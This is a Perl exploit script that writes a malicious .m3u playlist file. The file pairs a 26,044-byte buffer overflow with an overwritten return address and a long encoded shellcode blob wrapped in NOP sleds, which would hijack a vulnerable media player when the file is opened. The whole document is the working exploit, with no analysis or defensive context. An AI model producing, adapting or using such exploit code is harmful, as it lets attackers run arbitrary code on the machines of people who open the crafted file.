my $file= "test1.m3u";
my $junk= "A" x 26044;
my $eip = pack('V',0x01c5f23a);
my $shellcode = "\x90" x 25;
$shellcode = $shellcode."\x89\xe6\xd9\xf7\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x4b\x39\x45\x50\x43\x30\x43\x30\x43\x50\x4b\x39\x4b" .
"\x55\x46\x51\x48\x52\x42\x44\x4c\x4b\x50\x52\x50\x30\x4c" .
"\x4b\x51\x42\x44\x4c\x4c\x4b\x51\x42\x44\x54\x4c\x4b\x44" .
"\x32\x46\x48\x44\x4f\x4f\x47\x51\x5a\x51\x36\x46\x51\x4b" .
"\x4f\x50\x31\x49\x50\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x45" .
"\x52\x46\x4c\x51\x30\x49\x51\x48\x4f\x44\x4d\x43\x31\x49" .
"\x57\x4b\x52\x4c\x30\x46\x32\x51\x47\x4c\x4b\x50\x52\x42" .
"\x30\x4c\x4b\x47\x32\x47\x4c\x45\x51\x4e\x30\x4c\x4b\x47" .
"\x30\x44\x38\x4b\x35\x49\x50\x42\x54\x50\x4a\x43\x31\x4e" .
"\x30\x50\x50\x4c\x4b\x47\x38\x42\x38\x4c\x4b\x51\x48\x51" .
"\x30\x43\x31\x48\x53\x4a\x43\x47\x4c\x50\x49\x4c\x4b\x47" .
"\x44\x4c\x4b\x45\x51\x49\x46\x50\x31\x4b\x4f\x50\x31\x4f" .
"\x30\x4e\x4c\x4f\x31\x48\x4f\x44\x4d\x43\x31\x4f\x37\x46" .
"\x58\x4b\x50\x43\x45\x4b\x44\x44\x43\x43\x4d\x4c\x38\x47" .
"\x4b\x43\x4d\x51\x34\x42\x55\x4d\x32\x50\x58\x4c\x4b\x51" .
"\x48\x47\x54\x45\x51\x48\x53\x42\x46\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x51\x48\x45\x4c\x43\x31\x48\x53\x4c\x4b\x43" .
"\x34\x4c\x4b\x45\x51\x48\x50\x4c\x49\x50\x44\x47\x54\x46" .
"\x44\x51\x4b\x51\x4b\x45\x31\x51\x49\x50\x5a\x46\x31\x4b" .
"\x4f\x4d\x30\x50\x58\x51\x4f\x50\x5a\x4c\x4b\x45\x42\x4a" .
"\x4b\x4c\x46\x51\x4d\x43\x58\x46\x53\x50\x32\x43\x30\x43" .
"\x30\x43\x58\x43\x47\x44\x33\x47\x42\x51\x4f\x50\x54\x45" .
"\x38\x50\x4c\x44\x37\x51\x36\x44\x47\x4b\x4f\x49\x45\x48" .
"\x38\x4a\x30\x43\x31\x43\x30\x43\x30\x46\x49\x4f\x34\x46" .
"\x34\x50\x50\x43\x58\x51\x39\x4b\x30\x42\x4b\x43\x30\x4b" .
"\x4f\x49\x45\x46\x30\x46\x30\x46\x30\x46\x30\x51\x50\x46" .
"\x30\x47\x30\x46\x30\x43\x58\x4b\x5a\x44\x4f\x49\x4f\x4b" .
"\x50\x4b\x4f\x48\x55\x4c\x49\x4f\x37\x46\x51\x49\x4b\x46" .
"\x33\x43\x58\x44\x42\x43\x30\x44\x45\x46\x59\x4c\x49\x4b" .
"\x56\x43\x5a\x44\x50\x50\x56\x50\x57\x45\x38\x49\x52\x49" .
"\x4b\x47\x47\x45\x37\x4b\x4f\x49\x45\x46\x33\x50\x57\x45" .
"\x38\x4e\x57\x4a\x49\x46\x58\x4b\x4f\x4b\x4f\x49\x45\x51" .
"\x43\x51\x43\x46\x37\x45\x38\x43\x44\x4a\x4c\x47\x4b\x4b" .
"\x51\x4b\x4f\x4e\x35\x46\x37\x4d\x59\x4f\x37\x43\x58\x43" .
"\x45\x42\x4e\x50\x4d\x45\x31\x4b\x4f\x4e\x35\x43\x58\x45" .
"\x33\x42\x4d\x45\x34\x43\x30\x4d\x59\x4b\x53\x46\x37\x50" .
"\x57\x46\x37\x50\x31\x4c\x36\x42\x4a\x45\x42\x51\x49\x51" .
"\x46\x4b\x52\x4b\x4d\x43\x56\x48\x47\x51\x54\x47\x54\x47" .
"\x4c\x43\x31\x43\x31\x4c\x4d\x50\x44\x51\x34\x42\x30\x48" .
"\x46\x43\x30\x50\x44\x46\x34\x50\x50\x50\x56\x51\x46\x46" .
"\x36\x50\x46\x51\x46\x50\x4e\x46\x36\x50\x56\x46\x33\x50" .
"\x56\x42\x48\x42\x59\x48\x4c\x47\x4f\x4b\x36\x4b\x4f\x4e" .
"\x35\x4b\x39\x4d\x30\x50\x4e\x46\x36\x50\x46\x4b\x4f\x46" .
"\x50\x43\x58\x43\x38\x4b\x37\x45\x4d\x45\x30\x4b\x4f\x48" .
"\x55\x4f\x4b\x4a\x50\x4e\x55\x4f\x52\x50\x56\x43\x58\x4f" .
"\x56\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x49\x45\x47\x4c\x45" .
"\x56\x43\x4c\x44\x4a\x4d\x50\x4b\x4b\x4b\x50\x44\x35\x44" .
"\x45\x4f\x4b\x51\x57\x44\x53\x42\x52\x42\x4f\x43\x5a\x43" .
"\x30\x46\x33\x4b\x4f\x49\x45\x44\x4a\x41\x41";
$shellcode = $shellcode."\x90" x 25;
open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
